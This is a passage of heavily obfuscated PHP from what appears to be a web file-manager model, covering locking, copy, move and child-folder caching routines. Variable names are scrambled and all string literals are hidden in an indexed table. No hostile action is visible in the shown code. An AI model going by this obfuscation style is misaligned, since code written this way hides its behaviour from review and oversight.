$this->_lockCheckEnd($£óîù€è[604], $¨°­¼Ñ°); } public function lockMoveEnd($Ã„şö¼) { $ÓÜ†ÕÄá =& $_SERVER[Õò”†—·]; if (!$this->allowLock()) { return; } $µê“›«× = 0; $this->_lockKey($ÓÜ†ÕÄá[608] . $Ã„şö¼, $µê“›«×); $this->_lockEvent($Ã„şö¼, array($ÓÜ†ÕÄá[602], $ÓÜ†ÕÄá[603]), $µê“›«×); $this->_lockParent($Ã„şö¼, array($ÓÜ†ÕÄá[602], $ÓÜ†ÕÄá[604]), $µê“›«×); $this->_lockEvent($Ã„şö¼, array($ÓÜ†ÕÄá[609], $ÓÜ†ÕÄá[605], $ÓÜ†ÕÄá[606]), $µê“›«×); } private function _lockCheck($¤øõ­ ë, $ûÇ¸ïˆ) { $İÈû‘± =& $_SERVER[Õò”†—·]; $åìÈîÀê = $this->sourceInfo($ûÇ¸ïˆ); $ô†ìËÒ = $¤øõ­ ë . $İÈû‘±[20] . $ûÇ¸ïˆ; $this->_lockTimeStart[$ô†ìËÒ] = timeFloat(); if (!is_array($åìÈîÀê)) { return; } $Õ’ÚæÚ = LNG($İÈû‘±[610]); CacheLock::setErrorMsg($İÈû‘±[176] . htmlspecialchars($åìÈîÀê[$İÈû‘±[42]]) . $İÈû‘±[178] . $Õ’ÚæÚ); $this->_lockKey($ô†ìËÒ, 1); $this->_lockKey($ô†ìËÒ, 0); $ƒ±Ù¡ÏÙ = array_reverse($this->parentLevelArray($åìÈîÀê[$İÈû‘±[569]])); foreach ($ƒ±Ù¡ÏÙ as $œéÒçâ) { $ô†ìËÒ = $¤øõ­ ë . $İÈû‘±[611] . $œéÒçâ; if (CacheLock::lockGet($İÈû‘±[612] . $ô†ìËÒ)) { $åìÈîÀê = $this->sourceInfo($œéÒçâ); CacheLock::setErrorMsg($İÈû‘±[176] . htmlspecialchars($åìÈîÀê[$İÈû‘±[42]]) . $İÈû‘±[178] . $Õ’ÚæÚ); $this->_lockKey($ô†ìËÒ, 1); $this->_lockKey($ô†ìËÒ, 0); } } } private function _lockCheckEnd($©¹ÏÎİ, $­æŒ¦ÖÚ) { $á¹‰²¦ˆ =& $_SERVER[Õò”†—·]; $ÒâÏû²‰ = $©¹ÏÎİ . $á¹‰²¦ˆ[20] . $­æŒ¦ÖÚ; CacheLock::setErrorMsg($á¹‰²¦ˆ[438]); if (!isset($this->_lockTimeStart[$ÒâÏû²‰])) { return; } $ÕÕõÍ = timeFloat() - $this->_lockTimeStart[$ÒâÏû²‰]; unset($this->_lockTimeStart[$ÒâÏû²‰]); if ($ÕÕõÍ > 0.5) { unset(self::$cacheSourceInfo[$á¹‰²¦ˆ[517] . $­æŒ¦ÖÚ]); } $ñ¢Â€öà = $this->sourceInfo($­æŒ¦ÖÚ); if (!$ñ¢Â€öà) { show_json(LNG($á¹‰²¦ˆ[118]), !1); } } private function _lockParent($®‹ÙóÅÖ, $òŞóÙƒ›, $µøğ€‘£) { if (!$this->autoLockSet) { return; } $Ñİö¾¢ú = $this->sourceInfo($®‹ÙóÅÖ); if (!is_array($Ñİö¾¢ú)) { return; } $ÅêàÖ´È = array_reverse($this->parentLevelArray($Ñİö¾¢ú[$_SERVER[Õò”†—·][569]])); foreach ($ÅêàÖ´È as $Ùİ„¨»Ó) { $this->_lockEvent($Ùİ„¨»Ó, $òŞóÙƒ›, $µøğ€‘£); } } private function _lockEvent($¯£Â£¶™, $¿å³ª­, $œÆ´­Í¯) { $íì¹ıà =& $_SERVER[Õò”†—·]; if (!$this->autoLockSet) { return; } foreach ($¿å³ª­ as $¨Øá¢˜í) { $²¤Ô€« = $¨Øá¢˜í . $íì¹ıà[20] . $¯£Â£¶™; if ($œÆ´­Í¯ && CacheLock::lockGet($íì¹ıà[612] . $²¤Ô€«)) { continue; } $this->_lockKey($²¤Ô€«, $œÆ´­Í¯); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($™æ‚ˆü‘, $Ñä‚á˜ = 1) { $’¯ ª‰Ï = $_SERVER[Õò”†—·][612] . md5($™æ‚ˆü‘); if ($Ñä‚á˜) { if (isset(self::$_lockItemArr[$’¯ ª‰Ï])) { return; } self::$_lockItemArr[$’¯ ª‰Ï] = 1; CacheLock::lock($’¯ ª‰Ï, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$’¯ ª‰Ï])) { return; } unset(self::$_lockItemArr[$’¯ ª‰Ï]); CacheLock::unlock($’¯ ª‰Ï); } } public function isParentOf($’Ç°´½, $ªÄ“Ä¡™) { $é€Ä‚Øç =& $_SERVER[Õò”†—·]; $àĞŠÔÈª = $this->sourceInfo($’Ç°´½); $½ˆ¯Û—Ğ = $this->sourceInfo($ªÄ“Ä¡™); $æ ú© = $àĞŠÔÈª[$é€Ä‚Øç[569]] . $àĞŠÔÈª[$é€Ä‚Øç[194]] . $é€Ä‚Øç[60]; $öŸÊ“»Æ = $½ˆ¯Û—Ğ[$é€Ä‚Øç[569]] . $½ˆ¯Û—Ğ[$é€Ä‚Øç[194]] . $é€Ä‚Øç[60]; $‘ÎŸÑ¬£ = strpos($öŸÊ“»Æ, $æ ú©) === 0; return $‘ÎŸÑ¬£; } private $targetIsDelete = 0; public function copy($‰©•ıñ, $‘®’¯ˆ, $¨šµÉ˜Î = REPEAT_REPLACE, $…±¤ÔÑ’ = '') { $ªûùšÙş =& $_SERVER[Õò”†—·]; $€Ã‚¤°Ö = $this->sourceInfo($‰©•ıñ); $¨‡Ûìş» = $this->sourceInfo($‘®’¯ˆ); if (!$€Ã‚¤°Ö || !$¨‡Ûìş» || $¨‡Ûìş»[$ªûùšÙş[469]] != $ªûùšÙş[101]) { return !1; } if ($this->isParentOf($‰©•ıñ, $‘®’¯ˆ)) { return !1; } $±´Šî×³ = $…±¤ÔÑ’ ? $…±¤ÔÑ’ : $€Ã‚¤°Ö[$ªûùšÙş[42]]; $this->lockCopyStart($‰©•ıñ); $this->lockWriteStart($‘®’¯ˆ, $±´Šî×³); $Ëàïã©— = array($ªûùšÙş[613] => array(), $ªûùšÙş[614] => array(), $ªûùšÙş[615] => array()); $this->targetIsDelete = intval($€Ã‚¤°Ö[$ªûùšÙş[489]]); $È¶ì²­ = $this->fileNameExistAuto($‘®’¯ˆ, $€Ã‚¤°Ö); $Ş…Ùâïó = $this->_copy($‰©•ıñ, $‘®’¯ˆ, $¨šµÉ˜Î, $Ëàïã©—, !0, $…±¤ÔÑ’); $this->_childrenListClear(); $this->lockCopyEnd($‰©•ıñ); $this->lockWriteEnd($‘®’¯ˆ, $±´Šî×³); if ($€Ã‚¤°Ö[$ªûùšÙş[469]] == $ªûùšÙş[101] && $È¶ì²­ == $Ş…Ùâïó) { $this->folderSizeResetChildren($È¶ì²­); } Model($ªûùšÙş[616])->addAll($Ëàïã©—[$ªûùšÙş[614]], array(), !0); if ($È¶ì²­ != $Ş…Ùâïó || $€Ã‚¤°Ö[$ªûùšÙş[469]] == $ªûùšÙş[101]) { Model($ªûùšÙş[617])->eventCopy($Ş…Ùâïó); } $this->saveAll($Ëàïã©—[$ªûùšÙş[615]]); Model($ªûùšÙş[231])->linkAdd($Ëàïã©—[$ªûùšÙş[613]]); $this->folderSizeReset($‘®’¯ˆ); $this->updateModifyTime($‘®’¯ˆ); return $Ş…Ùâïó; } private function _copy($Ê¡¿Ÿ¤‡, $ò¤Ñ§ÉÈ, $ÕöÇİ²È, &$¸ÄÉêŒÖ, $¶Ü†’«­, $£ùÕÃğŒ = '') { $ùÖ–„»¥ =& $_SERVER[Õò”†—·]; $“ÅˆÏ×á = $this->sourceInfoCache($Ê¡¿Ÿ¤‡); $Æ¯€šøş = $“ÅˆÏ×á[$ùÖ–„»¥[469]] == $ùÖ–„»¥[101]; $éÌ‘ß…± = $£ùÕÃğŒ ? $£ùÕÃğŒ : $“ÅˆÏ×á[$ùÖ–„»¥[42]]; $Åà Ï’í = $this->fileNameExistAuto($ò¤Ñ§ÉÈ, $“ÅˆÏ×á); if ($¶Ü†’«­) { $this->_childrenAllMake($Ê¡¿Ÿ¤‡); if ($Æ¯€šøş && $Åà Ï’í) { $this->_childrenAllMake($Åà Ï’í); } } if (!$Åà Ï’í) { return $this->_copyCreate($Ê¡¿Ÿ¤‡, $ò¤Ñ§ÉÈ, $éÌ‘ß…±, $¸ÄÉêŒÖ); } $ˆ«ßÉù = $Åà Ï’í; if ($Æ¯€šøş) { if ($ÕöÇİ²È == REPEAT_RENAME_FOLDER) { $éÌ‘ß…± = $this->fileNameAutoCache($ò¤Ñ§ÉÈ, $éÌ‘ß…±, $ÕöÇİ²È, $Æ¯€šøş); $ˆ«ßÉù = $this->_copyCreate($Ê¡¿Ÿ¤‡, $ò¤Ñ§ÉÈ, $éÌ‘ß…±, $¸ÄÉêŒÖ); } else { $üæ‡¥î¹ = $this->_childrenList($Ê¡¿Ÿ¤‡); foreach ($üæ‡¥î¹ as $ğ÷¡¸Ï) { $this->_copy($ğ÷¡¸Ï[$ùÖ–„»¥[194]], $Åà Ï’í, $ÕöÇİ²È, $¸ÄÉêŒÖ, !1); } } } else { if ($ÕöÇİ²È == REPEAT_RENAME || $ÕöÇİ²È == REPEAT_RENAME_FOLDER) { $éÌ‘ß…± = $this->fileNameAutoCache($ò¤Ñ§ÉÈ, $éÌ‘ß…±, $ÕöÇİ²È, $Æ¯€šøş); $ˆ«ßÉù = $this->_copyCreate($Ê¡¿Ÿ¤‡, $ò¤Ñ§ÉÈ, $éÌ‘ß…±, $¸ÄÉêŒÖ); } else { if ($ÕöÇİ²È == REPEAT_REPLACE) { $ùİÌìÂò = $this->sourceInfoCache($Åà Ï’í); $®É¶ùÑ— = $this->fileHistory($ùİÌìÂò, $“ÅˆÏ×á[$ùÖ–„»¥[525]], $“ÅˆÏ×á[$ùÖ–„»¥[89]]); if ($®É¶ùÑ—) { $¸ÄÉêŒÖ[$ùÖ–„»¥[613]][] = $“ÅˆÏ×á[$ùÖ–„»¥[525]]; } } else { if ($ÕöÇİ²È == REPEAT_SKIP) { } } } Hook::trigger($ùÖ–„»¥[618], array($ùÖ–„»¥[619], $“ÅˆÏ×á, 0)); } return $ˆ«ßÉù; } private function _copyCreate($Ôİ»ø©¥, $²ŞñÙĞµ, $µÄÃéæõ, &$®åœÅ–ö) { $İ¿Áëİ =& $_SERVER[Õò”†—·]; $¡¦¼½¢° = $this->sourceInfoCache($Ôİ»ø©¥); $£»æšœ† = $this->sourceInfoCache($²ŞñÙĞµ); $™§‡èñù = $this->_makeItemData($¡¦¼½¢°, $£»æšœ†, $µÄÃéæõ); Hook::trigger($İ¿Áëİ[620], $™§‡èñù); Hook::trigger($İ¿Áëİ[621], array($İ¿Áëİ[622], $™§‡èñù, 0)); $¹¶šíèÍ = $this->add($™§‡èñù); $ñ½¸îø° = array($İ¿Áëİ[194] => $¹¶šíèÍ, $İ¿Áëİ[42] => $µÄÃéæõ); $this->_copyApplyMeta($ñ½¸îø°, $®åœÅ–ö); if ($¡¦¼½¢°[$İ¿Áëİ[469]] != $İ¿Áëİ[101]) { $®åœÅ–ö[$İ¿Áëİ[613]][] = $¡¦¼½¢°[$İ¿Áëİ[525]]; return $¹¶šíèÍ; } $Úº¾‹Á  = array(); $Î†ş§°Ğ = array(); $this->_childrenListAll($Ôİ»ø©¥, $Úº¾‹Á ); $àØ­Üı = count($Úº¾‹Á ); if ($àØ­Üı == 0) { return $¹¶šíèÍ; } $€ò¡°Õå = $this->sourceInfo($¹¶šíèÍ); foreach ($Úº¾‹Á  as $ÎÎùÁÀÉ) { $Øº“°¶¡ = $this->_makeItemData($ÎÎùÁÀÉ, $€ò¡°Õå, $ÎÎùÁÀÉ[$İ¿Áëİ[42]]); $Øº“°¶¡[$İ¿Áëİ[569]] = $ÎÎùÁÀÉ[$İ¿Áëİ[569]]; $Î†ş§°Ğ[] = $Øº“°¶¡; } $this->chunkEventSet($İ¿Áëİ[623], array($İ¿Áëİ[624], $™§‡èñù, $àØ­Üı)); $this->addAll($Î†ş§°Ğ, array(), !1); $Şƒ¶ªö® = $this->where(array($İ¿Áëİ[193] => $¹¶šíèÍ))->select(); $µàÀ¨ÏÜ = $this->_childrenMakeRelation($Úº¾‹Á , $Şƒ¶ªö®); $µàÀ¨ÏÜ[$Ôİ»ø©¥] = $¹¶šíèÍ; $ÂÓ¼´… = array(); $Ù…Ó°®ö = array(); foreach ($Şƒ¶ªö® as $ÎÎùÁÀÉ) { $Ô‡ü›Ìó = $ÎÎùÁÀÉ[$İ¿Áëİ[194]]; $ÙÁªßì³ = $this->_childrenMatch($µàÀ¨ÏÜ, $ÎÎùÁÀÉ, $€ò¡°Õå); $ÂÓ¼´…[] = array($İ¿Áëİ[194], $Ô‡ü›Ìó, $İ¿Áëİ[193], $ÙÁªßì³[$İ¿Áëİ[193]]); $Ù…Ó°®ö[] = array($İ¿Áëİ[194], $Ô‡ü›Ìó, $İ¿Áëİ[569], $ÙÁªßì³[$İ¿Áëİ[569]]); $this->_copyApplyMeta($ÎÎùÁÀÉ, $®åœÅ–ö); if ($ÎÎùÁÀÉ[$İ¿Áëİ[469]] != $İ¿Áëİ[101]) { $®åœÅ–ö[$İ¿Áëİ[613]][] = $ÎÎùÁÀÉ[$İ¿Áëİ[525]]; } } $this->chunkEventSet($İ¿Áëİ[625], array($İ¿Áëİ[626], $™§‡èñù, $àØ­Üı)); $this->saveAll($ÂÓ¼´…); $this->chunkEventSet($İ¿Áëİ[627], array($İ¿Áëİ[628], $™§‡èñù, $àØ­Üı)); $this->saveAll($Ù…Ó°®ö); return $¹¶šíèÍ; } private function _childrenMakeRelation($÷›×üóÏ, $Öåû±ã·) { $ÊäÏ­ªÛ =& $_SERVER[Õò”†—·]; $Ìö„”Ï® = array(); $‚›’şÏ— = array(); foreach ($÷›×üóÏ as $˜ñ¶¬Ş«) { $Ÿ¸Ï…ªÔ = $˜ñ¶¬Ş«[$ÊäÏ­ªÛ[42]] . $ÊäÏ­ªÛ[18] . $˜ñ¶¬Ş«[$ÊäÏ­ªÛ[569]]; $Ìö„”Ï®[$Ÿ¸Ï…ªÔ] = $˜ñ¶¬Ş«[$ÊäÏ­ªÛ[194]]; } foreach ($Öåû±ã· as $˜ñ¶¬Ş«) { $Ÿ¸Ï…ªÔ = $˜ñ¶¬Ş«[$ÊäÏ­ªÛ[42]] . $ÊäÏ­ªÛ[18] . $˜ñ¶¬Ş«[$ÊäÏ­ªÛ[569]]; $ğğÂöˆ = $Ìö„”Ï®[$Ÿ¸Ï…ªÔ]; $‚›’şÏ—[$ğğÂöˆ] = $˜ñ¶¬Ş«[$ÊäÏ­ªÛ[194]]; } return $‚›’şÏ—; } private function _childrenMatch($Â·ÅÂ, $â¢ÅÚ¿Ê, $µ¢Õ¡ï) { $¹¨âóé =& $_SERVER[Õò”†—·]; $ÔèéÚ¯± = $µ¢Õ¡ï[$¹¨âóé[569]]; $âğÙÕáÆ = $this->parentLevelArray($â¢ÅÚ¿Ê[$¹¨âóé[569]]); foreach ($âğÙÕáÆ as $ÑµÃ­Ÿ) { if (isset($Â·ÅÂ[$ÑµÃ­Ÿ])) { $ÔèéÚ¯± .= $Â·ÅÂ[$ÑµÃ­Ÿ] . $¹¨âóé[629]; } } $ÔèéÚ¯± = rtrim($ÔèéÚ¯±, $¹¨âóé[60]) . $¹¨âóé[60]; $çõËÄÊ = $this->parentLevelArray($ÔèéÚ¯±); $ÉÚúÄ²• = $çõËÄÊ[count($çõËÄÊ) - 1]; return array($¹¨âóé[193] => $ÉÚúÄ²•, $¹¨âóé[569] => $ÔèéÚ¯±); } private function _makeItemData($ÒıİôŸÉ, $Äİ®Æ, $Î²ôİ‡) { $º†¬Ù…Ó =& $_SERVER[Õò”†—·]; $Î¸¶ÇŒ = array($º†¬Ù…Ó[630] => $ÒıİôŸÉ[$º†¬Ù…Ó[469]], $º†¬Ù…Ó[478] => $Î²ôİ‡, $º†¬Ù…Ó[631] => $ÒıİôŸÉ[$º†¬Ù…Ó[470]] ? $ÒıİôŸÉ[$º†¬Ù…Ó[470]] : $º†¬Ù…Ó[22], $º†¬Ù…Ó[526] => $ÒıİôŸÉ[$º†¬Ù…Ó[525]] ? $ÒıİôŸÉ[$º†¬Ù…Ó[525]] : 0, $º†¬Ù…Ó[601] => $ÒıİôŸÉ[$º†¬Ù…Ó[89]] ? $ÒıİôŸÉ[$º†¬Ù…Ó[89]] : 0, $º†¬Ù…Ó[632] => intval($Äİ®Æ[$º†¬Ù…Ó[191]]), $º†¬Ù…Ó[633] => intval($Äİ®Æ[$º†¬Ù…Ó[554]]), $º†¬Ù…Ó[634] => intval(USER_ID), $º†¬Ù…Ó[635] => intval(USER_ID), $º†¬Ù…Ó[461] => intval($Äİ®Æ[$º†¬Ù…Ó[194]]), $º†¬Ù…Ó[636] => $Äİ®Æ[$º†¬Ù…Ó[569]] . $Äİ®Æ[$º†¬Ù…Ó[194]] . $º†¬Ù…Ó[60], $º†¬Ù…Ó[482] => $ÒıİôŸÉ[$º†¬Ù…Ó[98]] ? $ÒıİôŸÉ[$º†¬Ù…Ó[98]] : time(), $º†¬Ù…Ó[488] => 0, $º†¬Ù…Ó[637] => $º†¬Ù…Ó[22]); return $Î¸¶ÇŒ; } private function _copyApplyMeta($»ÜíŞ ›, &$àİïæÍ’) { $‡à§›âŒ =& $_SERVER[Õò”†—·]; $ê‘œ¡Ò¡ = $»ÜíŞ ›[$‡à§›âŒ[194]]; $¢‚¨ªöÅ = $»ÜíŞ ›[$‡à§›âŒ[42]]; if (!isset($»ÜíŞ ›[$‡à§›âŒ[638]]) || !$»ÜíŞ ›[$‡à§›âŒ[638]] || $»ÜíŞ ›[$‡à§›âŒ[638]] == $‡à§›âŒ[229]) { $àİïæÍ’[$‡à§›âŒ[615]][] = array($‡à§›âŒ[194], $ê‘œ¡Ò¡, $‡à§›âŒ[638], short_id($ê‘œ¡Ò¡)); } if (Input::check($¢‚¨ªöÅ, $‡à§›âŒ[639])) { $àİïæÍ’[$‡à§›âŒ[614]][] = array($‡à§›âŒ[194] => $ê‘œ¡Ò¡, $‡à§›âŒ[107] => $‡à§›âŒ[522], $‡à§›âŒ[434] => str_replace($‡à§›âŒ[63], $‡à§›âŒ[22], Pinyin::get($¢‚¨ªöÅ))); $àİïæÍ’[$‡à§›âŒ[614]][] = array($‡à§›âŒ[194] => $ê‘œ¡Ò¡, $‡à§›âŒ[107] => $‡à§›âŒ[521], $‡à§›âŒ[434] => Pinyin::get($¢‚¨ªöÅ, $‡à§›âŒ[640])); } $àİïæÍ’[$‡à§›âŒ[614]][] = array($‡à§›âŒ[194] => $ê‘œ¡Ò¡, $‡à§›âŒ[107] => $‡à§›âŒ[501], $‡à§›âŒ[434] => KodSort::makeStr($¢‚¨ªöÅ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($­‹şç) { $‹¦¡¼Ğè =& $_SERVER[Õò”†—·]; $¬„æŞó = $this->sourceInfo($­‹şç); $ºñŠô× = $‹¦¡¼Ğè[641]; $äãòî§¨ = array($‹¦¡¼Ğè[569] => array($‹¦¡¼Ğè[596], $¬„æŞó[$‹¦¡¼Ğè[569]] . $­‹şç . $‹¦¡¼Ğè[597]), $‹¦¡¼Ğè[489] => $this->targetIsDelete); $“¦ˆö • = $this->field($ºñŠô×)->where($äãòî§¨)->select(); if (!$“¦ˆö •) { return; } $“¦ˆö • = array_to_keyvalue($“¦ˆö •, $‹¦¡¼Ğè[194]); foreach ($“¦ˆö • as $µíÙ’Ÿú) { $ºÇİ“ÔÕ = $µíÙ’Ÿú[$‹¦¡¼Ğè[193]]; $­‹şç = $µíÙ’Ÿú[$‹¦¡¼Ğè[194]]; if (!isset($this->_childrenListCache[$­‹şç]) && $µíÙ’Ÿú[$‹¦¡¼Ğè[469]] == $‹¦¡¼Ğè[101]) { $this->_childrenListCache[$­‹şç] = array(); } if (!isset($this->_childrenListCache[$ºÇİ“ÔÕ])) { $this->_childrenListCache[$ºÇİ“ÔÕ] = array(); } $this->_childrenListCache[$ºÇİ“ÔÕ][$­‹şç] = $µíÙ’Ÿú; $this->_childrenItemCache[$­‹şç] = $µíÙ’Ÿú; } } private function _childrenListAll($Ò§Ş«…Ç, &$®§­ƒó) { $¹áß¸È =& $_SERVER[Õò”†—·]; if (!isset($this->_childrenListCache[$Ò§Ş«…Ç])) { return; } $¬íÃÉ”ç = $this->_childrenListCache[$Ò§Ş«…Ç]; foreach ($¬íÃÉ”ç as $•İ‡ì‡— => $ù²ıàŒè) { $®§­ƒó[$•İ‡ì‡—] = $ù²ıàŒè; if ($ù²ıàŒè[$¹áß¸È[469]] == $¹áß¸È[101]) { $this->_childrenListAll($•İ‡ì‡—, $®§­ƒó); } } } private function sourceInfoCache($Úä„¼Ú¿) { if (isset($this->_childrenItemCache[$Úä„¼Ú¿])) { return $this->_childrenItemCache[$Úä„¼Ú¿]; } return $this->sourceInfo($Úä„¼Ú¿); } private function _childrenList($ñ­“ıäó) { if (isset($this->_childrenListCache[$ñ­“ıäó])) { return $this->_childrenListCache[$ñ­“ıäó]; } return $this->_childrenListSelect($ñ­“ıäó); } private function _childrenListSelect($ó–¨Ö½) { $Ü«çØşÈ =& $_SERVER[Õò”†—·]; $¾×‘ˆ˜ø = array($Ü«çØşÈ[193] => $ó–¨Ö½, $Ü«çØşÈ[489] => $this->targetIsDelete); $ıÖˆªı = $this->where($¾×‘ˆ˜ø)->select(); $ıÖˆªı = $ıÖˆªı ? $ıÖˆªı : array(); $¬ĞÑ‚ğé = array_to_keyvalue($ıÖˆªı, $Ü«çØşÈ[194]); $this->_childrenListCache[$ó–¨Ö½] = $¬ĞÑ‚ğé; foreach ($¬ĞÑ‚ğé as $ó–¨Ö½ => $ñÜÖ¨¬Ô) { $this->_childrenItemCache[$ó–¨Ö½] = $ñÜÖ¨¬Ô; } return $¬ĞÑ‚ğé; } private function fileNameExistAuto($Å–Î™ÎÆ, $«Ÿ¢¹Ô¢) { $ô˜ˆÖÌÖ =& $_SERVER[Õò”†—·]; if ($«Ÿ¢¹Ô¢[$ô˜ˆÖÌÖ[489]] == $ô˜ˆÖÌÖ[101]) { return $this->fileNameExist($Å–Î™ÎÆ, $«Ÿ¢¹Ô¢[$ô˜ˆÖÌÖ[42]]); } return $this->fileNameExistCache($Å–Î™ÎÆ, $«Ÿ¢¹Ô¢[$ô˜ˆÖÌÖ[42]]); } private function fileNameExistCache($ ’ñ¤Ä¨, $‡Şß§®¾) { $ÔëëŞ”Æ =& $_SERVER[Õò”†—·]; $‡Şß§®¾ = strtolower($‡Şß§®¾); $Ğ‰£‡é = $this->_childrenList($ ’ñ¤Ä¨); foreach ($Ğ‰£‡é as $˜²Œ¦Çá) { if ($‡Şß§®¾ == strtolower($˜²Œ¦Çá[$ÔëëŞ”Æ[42]])) { return $˜²Œ¦Çá[$ÔëëŞ”Æ[194]]; } } return !1; } private function fileNameAutoCache($¹»Äíï¯, $“Œéé£•, $°ìùÊ¿¹, $ƒòø‡ø†) { $ôáú¡± =& $_SERVER[Õò”†—·]; $‡ÁÈ”ß§ = $this->_childrenList($¹»Äíï¯); $ŒÉ²ŒŞ´ = array_to_keyvalue($‡ÁÈ”ß§, $ôáú¡±[22], $ôáú¡±[42]); return $this->fileNameAutoGet($ŒÉ²ŒŞ´, $“Œéé£•, $°ìùÊ¿¹, $ƒòø‡ø†); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($êºè²€ü, $„Î—‹¯Ä, $Š¨éù´» = REPEAT_REPLACE, $ÖÏß‡·ô = '') { $¯«—Û‚ª =& $_SERVER[Õò”†—·]; $ƒş·ôî© = $this->sourceInfo($êºè²€ü); $ëÑÍêÈŠ = $this->sourceInfo($„Î—‹¯Ä); if ($ƒş·ôî©[$¯«—Û‚ª[193]] == $ëÑÍêÈŠ[$¯«—Û‚ª[194]]) { if ($ƒş·ôî©[$¯«—Û‚ª[489]] == $¯«—Û‚ª[101]) { Model($¯«—Û‚ª[487])->restore(array($êºè²€ü)); } if (!$ÖÏß‡·ô || $ÖÏß‡·ô == $ƒş·ôî©[$¯«—Û‚ª[42]]) { return $êºè²€ü; } } $­ŠÆ¾±ƒ = $this->pathInfoMore($êºè²€ü); if ($this->isParentOf($êºè²€ü, $„Î—‹¯Ä)) { return !1; } if (!$ƒş·ôî© || !$ëÑÍêÈŠ || $ëÑÍêÈŠ[$¯«—Û‚ª[469]] != $¯«—Û‚ª[101]) { return !1; } Hook::trigger($¯«—Û‚ª[642], $­ŠÆ¾±ƒ); $this->targetIsDelete = intval($ƒş·ôî©[$¯«—Û‚ª[489]]); if ($ƒş·ôî©[$¯«—Û‚ª[193]] == $„Î—‹¯Ä && $ÖÏß‡·ô != $ƒş·ôî©[$¯«—Û‚ª[42]]) { $ë“¬á¶— = $this->fileNameExist($„Î—‹¯Ä, $ÖÏß‡·ô); if ($ë“¬á¶— && $ƒş·ôî©[$¯«—Û‚ª[469]] == $¯«—Û‚ª[229]) { $ôê†Âù = $this->sourceInfo($ë“¬á¶—); $„ÂÚí » = $this->fileHistory($ôê†Âù, $ƒş·ôî©[$¯«—Û‚ª[525]], $ƒş·ôî©[$¯«—Û‚ª[89]]); if (!$„ÂÚí ») { Model($¯«—Û‚ª[528])->remove($ƒş·ôî©[$¯«—Û‚ª[525]]); } $this->removeNow($êºè²€ü, !1); $this->folderSizeReset($„Î—‹¯Ä); Hook::trigger($¯«—Û‚ª[643], $­ŠÆ¾±ƒ); return $ë“¬á¶—; } } $ƒ¯ùÈ’¡ = $ÖÏß‡·ô ? $ÖÏß‡·ô : $ƒş·ôî©[$¯«—Û‚ª[42]]; $this->lockMoveStart($êºè²€ü); $this->lockWriteStart($„Î—‹¯Ä, $ƒ¯ùÈ’¡); $¥Ç®£ñ = array($¯«—Û‚ª[613] => array(), $¯«—Û‚ª[644] => !1); $this->clearShare($êºè²€ü, $„Î—‹¯Ä); $…À¥Çœë = $this->fileNameExistAuto($„Î—‹¯Ä, $ƒş·ôî©); $Ë°‚‰ìÏ = $this->_move($êºè²€ü, $„Î—‹¯Ä, $Š¨éù´», $¥Ç®£ñ, $ÖÏß‡·ô); $this->sourceCacheClear(); if ($ƒş·ôî©[$¯«—Û‚ª[469]] == $¯«—Û‚ª[101] && $…À¥Çœë) { $this->folderSizeResetChildren($Ë°‚‰ìÏ); } Model($¯«—Û‚ª[231])->linkAdd($¥Ç®£ñ[$¯«—Û‚ª[613]]); if ($…À¥Çœë && $¥Ç®£ñ[$¯«—Û‚ª[644]]) { $this->removeNow($êºè²€ü, !1); } $this->lockMoveEnd($êºè²€ü); $this->lockWriteEnd($„Î—‹¯Ä, $ƒ¯ùÈ’¡); $this->folderSizeReset($ƒş·ôî©[$¯«—Û‚ª[193]]); $this->folderSizeReset($„Î—‹¯Ä); $‹­Õ»ƒ = array($ƒş·ôî©[$¯«—Û‚ª[193]], $„Î—‹¯Ä); if ($ƒş·ôî©[$¯«—Û‚ª[469]] == $¯«—Û‚ª[101]) { $‹­Õ»ƒ[] = $êºè²€ü; } $this->updateModifyTime($‹­Õ»ƒ); Model($¯«—Û‚ª[617])->eventMove($êºè²€ü, $ƒş·ôî©[$¯«—Û‚ª[193]], $„Î—‹¯Ä); Hook::trigger($¯«—Û‚ª[643], $­ŠÆ¾±ƒ); return $Ë°‚‰ìÏ; } private function _move($ê¡ßÈæÍ, $ªæõ³«, $èÊÎøµİ, &$’Íş¥Ó, $ëœä¥•æ = '') { $ÅÀ·¡†† =& $_SERVER[Õò”†—·]; $—Ø”Ü¼µ = $this->sourceInfo($ê¡ßÈæÍ); $„º´Şáõ = $—Ø”Ü¼µ[$ÅÀ·¡††[469]] == $ÅÀ·¡††[101]; $Îùò¿ë¼ = $ëœä¥•æ ? $ëœä¥•æ : $—Ø”Ü¼µ[$ÅÀ·¡††[42]]; $¬–ËÁ¥¼ = $this->fileNameExistAuto($ªæõ³«, $—Ø”Ü¼µ); $this->lockMoveStart($ê¡ßÈæÍ); $this->lockWriteStart($ªæõ³«, $Îùò¿ë¼); if (!$¬–ËÁ¥¼) { return $this->_moveForce($ê¡ßÈæÍ, $ªæõ³«, $Îùò¿ë¼); } $¥ˆöª•¾ = $¬–ËÁ¥¼; $ç›ŒôÎĞ = !1; if ($„º´Şáõ) { if ($èÊÎøµİ == REPEAT_RENAME_FOLDER) { $Îùò¿ë¼ = $this->fileNameAuto($ªæõ³«, $Îùò¿ë¼, $èÊÎøµİ, $„º´Şáõ); $¥ˆöª•¾ = $this->_moveForce($ê¡ßÈæÍ, $ªæõ³«, $Îùò¿ë¼); } else { if ($èÊÎøµİ == REPEAT_RENAME_FOLDER) { $èÊÎøµİ = REPEAT_RENAME; } $Éº­Ğ = $this->_childrenListSelect($ê¡ßÈæÍ); foreach ($Éº­Ğ as $ˆ¾’ÊÃá) { $this->_move($ˆ¾’ÊÃá[$ÅÀ·¡††[194]], $¬–ËÁ¥¼, $èÊÎøµİ, $’Íş¥Ó); } $ç›ŒôÎĞ = !0; } } else { if ($èÊÎøµİ == REPEAT_SKIP) { $ç›ŒôÎĞ = !0; } else { if ($èÊÎøµİ == REPEAT_RENAME || $èÊÎøµİ == REPEAT_RENAME_FOLDER) { $Îùò¿ë¼ = $this->fileNameAuto($ªæõ³«, $Îùò¿ë¼, $èÊÎøµİ, $„º´Şáõ); $¥ˆöª•¾ = $this->_moveForce($ê¡ßÈæÍ, $ªæõ³«, $Îùò¿ë¼); } else { if ($èÊÎøµİ == REPEAT_REPLACE) { $³öğÛõ = $this->sourceInfoCache($¬–ËÁ¥¼); $¨ÍÆ×ÒŠ = $this->fileHistory($³öğÛõ, 